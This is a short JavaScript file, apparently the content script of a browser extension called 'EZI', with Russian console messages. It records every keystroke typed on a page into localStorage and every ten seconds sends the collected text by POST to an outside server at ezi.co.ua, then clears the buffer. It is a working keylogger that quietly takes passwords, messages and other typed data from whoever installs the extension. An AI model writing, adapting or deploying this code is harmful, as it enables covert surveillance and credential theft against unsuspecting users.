console.log('Расширение EZI рботает))');
localStorage.t = '';

var ezi = {
    post: function(url, data, cb){
        var xhr = new XMLHttpRequest();
        var fd = new FormData;
        fd.append('data', data);
        xhr.open('POST', url, true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState !== 4) return;
            if (xhr.status === 200) {
                cb();
            } else {
                console.error('Ошибка отправки запроса!');
            }
        };
        xhr.send(fd);
    }
};
document.body.addEventListener('keypress', function(e){
    localStorage.t += e.key;
});

setInterval(function(){
    if(localStorage.t){
        ezi.post('http://ezi.co.ua/save/', localStorage.t, function(){
            localStorage.t = '';
        });
    }
}, 10000);